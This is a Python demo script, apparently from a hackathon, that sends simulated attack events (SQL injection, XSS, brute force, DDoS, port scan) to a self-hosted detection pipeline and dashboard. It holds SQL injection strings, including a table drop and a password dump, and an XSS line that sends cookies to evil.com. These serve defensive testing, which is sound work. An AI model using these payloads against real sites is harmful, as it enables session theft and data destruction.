import requests
import time
import uuid
import random
import json
import threading
import sys
import os
from datetime import datetime

# ============================================================
# CONFIGURATION - UPDATE THIS FOR YOUR DEPLOYMENT
# ============================================================
# For local development, use "localhost" or "127.0.0.1"
# For EC2 deployment, use your EC2 public IP or domain
# Example: SERVER_URL = "http://54.123.45.67"
# Example: SERVER_URL = "http://your-domain.com"
# ============================================================

# You can also set via environment variable: export SERVER_GUARD_URL="http://your-server-ip"
SERVER_URL = os.environ.get("SERVER_GUARD_URL", "http://localhost")

# Service endpoints (automatically configured based on SERVER_URL)
GATEWAY_URL = f"{SERVER_URL}:8000/internal/telemetry"
INGEST_URL = f"{SERVER_URL}:8002/ingest"
MODEL_SERVICE_URL = f"{SERVER_URL}:5000/api/analyze"
DETECTION_ENGINE_URL = f"{SERVER_URL}:8001/analyze"

# ANSI Colors for nicer terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Global control flags
running = True
background_traffic_active = False

# SQL Injection payloads (matches frontend)
SQL_PAYLOADS = [
    "' OR 1=1 --",
    "UNION SELECT username, password FROM users",
    "admin' --",
    "1; DROP TABLE production_logs",
    "' OR '1'='1",
    "SELECT * FROM data WHERE id=1 OR 1=1"
]

def send_to_model_service(data, verbose=True):
    """Sends payload to Model Microservice for AI detection."""
    try:
        resp = requests.post(MODEL_SERVICE_URL, json=data, timeout=3)
        if resp.status_code == 200:
            result = resp.json()
            if verbose:
                status = result.get('status', 'unknown')
                source = result.get('source', 'AI')
                score = result.get('score', 0)
                if status == 'blocked':
                    print(f"{Colors.FAIL}   [ML BLOCKED] {source} | Confidence: {int(score*100)}%{Colors.ENDC}")
                else:
                    print(f"{Colors.GREEN}   [ML ALLOWED] Traffic passed AI check{Colors.ENDC}")
            return result
    except requests.exceptions.RequestException as e:
        if verbose:
            print(f"{Colors.WARNING}   [ML] Model service unreachable{Colors.ENDC}")
    return None

def send_to_ingest(data, verbose=False):
    """Sends payload to Ingest Service -> Detection Engine pipeline."""
    try:
        requests.post(INGEST_URL, json=data, timeout=1)
    except requests.exceptions.RequestException:
        pass

def send_to_gateway(data, verbose=False):
    """Sends payload to Gateway for frontend visualization."""
    try:
        requests.post(GATEWAY_URL, json=data, timeout=1)
    except requests.exceptions.RequestException:
        pass

def send_full_pipeline(ingest_data, ml_data=None, verbose=True):
    """Sends to all services for full pipeline integration."""
    # 1. Send to Model Service (AI detection)
    if ml_data:
        send_to_model_service(ml_data, verbose)
    
    # 2. Send to Ingest -> Detection Engine (Rule-based detection)
    send_to_ingest(ingest_data, verbose)
    
    # 3. Send to Gateway (Real-time visualization)
    send_to_gateway(ingest_data, verbose)

def generate_safe_traffic():
    """Generates continuous background safe traffic."""
    while running and background_traffic_active:
        event_id = str(uuid.uuid4())
        
        # Randomize safe metrics
        cpu = random.uniform(10, 45)
        memory = random.uniform(20, 60)
        network = random.uniform(10, 80)
        
        # Ingest format
        ingest_payload = {
            "event_id": event_id,
            "source_ip": f"192.168.1.{random.randint(10, 50)}",
            "domain": "web_server",
            "service": "web-server-01",
            "event_type": "metric",
            "payload": {
                "cpu": cpu,
                "memory": memory,
                "network": network,
                "requests": random.randint(5, 20)
            },
            "timestamp": int(time.time())
        }
        
        # ML format (safe traffic)
        ml_payload = {
            "service_type": "web_server",
            "payload": "GET /api/status HTTP/1.1",
            "network_data": {
                "Rate": random.randint(10, 200),
                "syn_count": random.randint(0, 3),
                "IAT": random.uniform(1.0, 4.0)
            },
            "server_metrics": {
                "cpu_usage": cpu,
                "ram_usage": memory
            }
        }
        
        send_full_pipeline(ingest_payload, ml_payload, verbose=False)
        time.sleep(1.5)

def launch_attack(attack_type):
    """Launches a specific type of attack through full pipeline."""
    
    attacker_ip = f"10.66.6.{random.randint(10, 99)}"
    event_id = str(uuid.uuid4())
    
    if attack_type == "sql_injection":
        print(f"\n{Colors.FAIL}🚀 Launching SQL Injection Attack...{Colors.ENDC}")
        print(f"{Colors.FAIL}   Source: {attacker_ip} | Target: db-server-01{Colors.ENDC}")
        
        sql_payload = random.choice(SQL_PAYLOADS)
        
        # ML format for Model Microservice
        ml_payload = {
            "service_type": "web_frontend",
            "source_ip": attacker_ip,
            "attack_type": "sql_injection",
            "payload": sql_payload,
            "network_data": {
                "Rate": random.randint(50, 200),
                "syn_count": random.randint(1, 5),
                "IAT": random.uniform(0.5, 2.0)
            },
            "server_metrics": {
                "cpu_usage": random.randint(20, 40),
                "ram_usage": random.randint(30, 50)
            }
        }
        
        # Ingest format for Detection Engine
        ingest_payload = {
            "event_id": event_id,
            "source_ip": attacker_ip,
            "domain": "web_server",
            "service": "db-server-01",
            "event_type": "sql_injection_attempt",
            "payload": {
                "query": sql_payload,
                "username": "admin_test",
                "source_ip": attacker_ip
            },
            "timestamp": int(time.time())
        }
        
        send_full_pipeline(ingest_payload, ml_payload)
        print(f"{Colors.GREEN}   Payload Sent! Check Dashboard.{Colors.ENDC}\n")

    elif attack_type == "xss":
        print(f"\n{Colors.FAIL}💉 Injecting XSS Payload...{Colors.ENDC}")
        print(f"{Colors.FAIL}   Source: {attacker_ip} | Target: web-frontend{Colors.ENDC}")
        
        xss_payload = "<script>fetch('http://evil.com?cookie='+document.cookie)</script>"
        
        ml_payload = {
            "service_type": "web_frontend",
            "source_ip": attacker_ip,
            "attack_type": "xss",
            "payload": xss_payload,
            "network_data": {
                "Rate": random.randint(30, 100),
                "syn_count": random.randint(1, 3),
                "IAT": random.uniform(1.0, 3.0)
            },
            "server_metrics": {
                "cpu_usage": random.randint(15, 35),
                "ram_usage": random.randint(25, 45)
            }
        }
        
        ingest_payload = {
            "event_id": event_id,
            "source_ip": attacker_ip,
            "domain": "web_server",
            "service": "web-frontend",
            "event_type": "xss_attempt",
            "payload": {
                "query": xss_payload,
                "username": "victim_user",
                "source_ip": attacker_ip
            },
            "timestamp": int(time.time())
        }
        
        send_full_pipeline(ingest_payload, ml_payload)
        print(f"{Colors.GREEN}   Payload Sent! Check Dashboard.{Colors.ENDC}\n")

    elif attack_type == "brute_force":
        print(f"\n{Colors.WARNING}🔓 Starting Brute Force Simulation (10 attempts)...{Colors.ENDC}")
        
        for i in range(10):
            event_id = str(uuid.uuid4())
            
            # ML format for brute force
            ml_payload = {
                "service_type": "auth_service",
                "source_ip": attacker_ip,
                "attack_type": "brute_force",
                "payload": "LOGIN_ATTEMPT",
                "auth_data": {
                    "username": "admin",
                    "failed_attempts": 50 + (i * 15),  # Escalating attempts
                    "attempt_rate": 40 + (i * 5)
                },
                "network_data": {
                    "Rate": 500 + (i * 100),
                    "syn_count": 10 + i,
                    "IAT": 0.1 + (i * 0.02)
                },
                "server_metrics": {
                    "cpu_usage": 30 + (i * 5),
                    "ram_usage": 40 + (i * 3)
                }
            }
            
            ingest_payload = {
                "event_id": event_id,
                "source_ip": attacker_ip,
                "domain": "web_server",
                "service": "auth-service",
                "event_type": "auth_failure",
                "payload": {
                    "username": "admin",
                    "success": False,
                    "password": f"pass{i}",
                    "source_ip": attacker_ip
                },
                "timestamp": int(time.time())
            }
            
            print(f"{Colors.FAIL}   [Attempt {i+1}] Login failed for user 'admin' from {attacker_ip}{Colors.ENDC}")
            send_full_pipeline(ingest_payload, ml_payload, verbose=(i == 9))  # Only show ML result on last attempt
            time.sleep(0.3)
            
        print(f"{Colors.WARNING}   Brute Force Simulation Complete.{Colors.ENDC}\n")

    elif attack_type == "ddos":
        print(f"\n{Colors.FAIL}🔥 STARTING DDoS FLOOD (30 packets)...{Colors.ENDC}")
        
        for i in range(30):
            event_id = str(uuid.uuid4())
            botnet_ip = f"192.168.99.{random.randint(1, 255)}"
            
            # ML format for DDoS
            ml_payload = {
                "service_type": "api_gateway",
                "source_ip": botnet_ip,
                "attack_type": "ddos",
                "payload": "TCP_FLOW_DATA_ONLY",
                "network_data": {
                    "Rate": 8000 + (i * 500) + random.randint(0, 2000),
                    "syn_count": 100 + (i * 10) + random.randint(0, 50),
                    "IAT": 0.001 + random.uniform(0, 0.01),
                    "Tot size": 64 + random.randint(0, 64)
                },
                "server_metrics": {
                    "cpu_usage": 50 + (i * 1.5),  # Not crash mode
                    "ram_usage": 60 + (i * 1)
                }
            }
            
            ingest_payload = {
                "event_id": event_id,
                "source_ip": botnet_ip,
                "domain": "web_server",
                "service": "web-lb-01",
                "event_type": "metric_flood",
                "payload": {
                    "cpu": 80 + random.randint(0, 15),
                    "memory": 85 + random.randint(0, 10),
                    "network": 8000 + i * 200,
                    "syn_count": 100 + i * 10,
                    "source_ip": botnet_ip
                },
                "timestamp": int(time.time())
            }
            
            if i % 10 == 0:
                print(f"{Colors.FAIL}   >>> Flooding... Packet batch {i}{Colors.ENDC}")
                send_full_pipeline(ingest_payload, ml_payload, verbose=True)
            else:
                send_full_pipeline(ingest_payload, ml_payload, verbose=False)
            
            time.sleep(0.08)
            
        print(f"{Colors.FAIL}   DDoS Flood Complete.{Colors.ENDC}\n")

    elif attack_type == "port_scan":
        print(f"\n{Colors.CYAN}🔍 Starting Port Scan Reconnaissance...{Colors.ENDC}")
        
        ml_payload = {
            "service_type": "network_scanner",
            "source_ip": attacker_ip,
            "attack_type": "port_scan",
            "payload": "NMAP_SYN_SCAN",
            "scan_data": {
                "ports_scanned": 1000 + random.randint(0, 64000),
                "scan_rate": 500 + random.randint(0, 500),
                "syn_packets": 200 + random.randint(0, 300)
            },
            "network_data": {
                "Rate": 500 + random.randint(0, 1000),
                "syn_count": 200 + random.randint(0, 300),
                "IAT": 0.01 + random.uniform(0, 0.05)
            },
            "server_metrics": {
                "cpu_usage": random.randint(10, 30),
                "ram_usage": random.randint(20, 40)
            }
        }
        
        ingest_payload = {
            "event_id": event_id,
            "source_ip": attacker_ip,
            "domain": "network",
            "service": "firewall-01",
            "event_type": "port_scan",
            "payload": {
                "ports_scanned": ml_payload["scan_data"]["ports_scanned"],
                "scan_type": "SYN",
                "source_ip": attacker_ip
            },
            "timestamp": int(time.time())
        }
        
        print(f"{Colors.CYAN}   Source: {attacker_ip} | Scanning ports...{Colors.ENDC}")
        send_full_pipeline(ingest_payload, ml_payload)
        print(f"{Colors.GREEN}   Scan Complete! Check Dashboard.{Colors.ENDC}\n")

    else:
        print("Unknown attack type")

def check_services():
    """Check which services are online."""
    print(f"\n{Colors.CYAN}Checking service status...{Colors.ENDC}")
    print(f"{Colors.CYAN}Server: {SERVER_URL}{Colors.ENDC}")
    
    services = [
        ("Ingest Service", f"{SERVER_URL}:8002/health"),
        ("Detection Engine", f"{SERVER_URL}:8001/health"),
        ("Alert Manager", f"{SERVER_URL}:8003/health"),
        ("Response Engine", f"{SERVER_URL}:8004/health"),
        ("Model Microservice", f"{SERVER_URL}:5000/health"),
        ("API Gateway", f"{SERVER_URL}:8000/health"),
    ]
    
    for name, url in services:
        try:
            resp = requests.get(url, timeout=2)
            if resp.status_code == 200:
                print(f"  {Colors.GREEN}✓ {name}{Colors.ENDC}")
            else:
                print(f"  {Colors.WARNING}⚠ {name} (HTTP {resp.status_code}){Colors.ENDC}")
        except:
            print(f"  {Colors.FAIL}✗ {name} (Offline){Colors.ENDC}")
    print()

def print_menu():
    print(f"\n{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════{Colors.ENDC}")
    print(f"{Colors.CYAN}{Colors.BOLD}   SERVER GUARD - FULL PIPELINE DEMO CONTROLLER  {Colors.ENDC}")
    print(f"{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════{Colors.ENDC}")
    print(f"{Colors.CYAN}0.{Colors.ENDC} Check Service Status")
    print(f"{Colors.CYAN}1.{Colors.ENDC} Toggle Safe Background Traffic  [{Colors.GREEN if background_traffic_active else Colors.WARNING}{'ON' if background_traffic_active else 'OFF'}{Colors.ENDC}]")
    print(f"{Colors.CYAN}2.{Colors.ENDC} {Colors.FAIL}Launch SQL Injection Attack{Colors.ENDC}")
    print(f"{Colors.CYAN}3.{Colors.ENDC} {Colors.FAIL}Launch XSS Attack{Colors.ENDC}")
    print(f"{Colors.CYAN}4.{Colors.ENDC} {Colors.WARNING}Simulate Brute Force Attack{Colors.ENDC}")
    print(f"{Colors.CYAN}5.{Colors.ENDC} {Colors.FAIL}Simulate DDoS Flood{Colors.ENDC}")
    print(f"{Colors.CYAN}6.{Colors.ENDC} {Colors.BLUE}Simulate Port Scan{Colors.ENDC}")
    print(f"{Colors.CYAN}7.{Colors.ENDC} Exit")
    print(f"{Colors.CYAN}═══════════════════════════════════════════════{Colors.ENDC}")

def main():
    global background_traffic_active, running
    
    # Start background thread for safe traffic
    bg_thread = threading.Thread(target=generate_safe_traffic)
    bg_thread.daemon = True
    bg_thread.start()

    print(f"\n{Colors.BOLD}╔═══════════════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.BOLD}║     Welcome to Server Guard Full Pipeline Demo    ║{Colors.ENDC}")
    print(f"{Colors.BOLD}║                                                   ║{Colors.ENDC}")
    print(f"{Colors.BOLD}║  This demo sends attacks through ALL services:    ║{Colors.ENDC}")
    print(f"{Colors.BOLD}║  Model Service → Alert Manager → Response Engine  ║{Colors.ENDC}")
    print(f"{Colors.BOLD}║  Ingest → Detection Engine → Alert Manager        ║{Colors.ENDC}")
    print(f"{Colors.BOLD}║  Gateway → Frontend (Real-time Dashboard)         ║{Colors.ENDC}")
    print(f"{Colors.BOLD}╚═══════════════════════════════════════════════════╝{Colors.ENDC}")
    
    # Skip health check - services are running
    print(f"\n{Colors.GREEN}Server: {SERVER_URL} - Ready!{Colors.ENDC}\n")
    
    while True:
        print_menu()
        choice = input(f"{Colors.YELLOW}Select an option (0-7): {Colors.ENDC}").strip()
        
        if choice == '0':
            check_services()
        elif choice == '1':
            background_traffic_active = not background_traffic_active
            status = "STARTED" if background_traffic_active else "STOPPED"
            color = Colors.GREEN if background_traffic_active else Colors.WARNING
            print(f"\n{color}Background Safe Traffic {status}{Colors.ENDC}")
        elif choice == '2':
            launch_attack("sql_injection")
        elif choice == '3':
            launch_attack("xss")
        elif choice == '4':
            launch_attack("brute_force")
        elif choice == '5':
            launch_attack("ddos")
        elif choice == '6':
            launch_attack("port_scan")
        elif choice == '7':
            print(f"\n{Colors.BLUE}Good luck with the judges! Exiting...{Colors.ENDC}")
            running = False
            break
        else:
            print("Invalid option. Try again.")
            
        time.sleep(0.5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting...")
        running = False
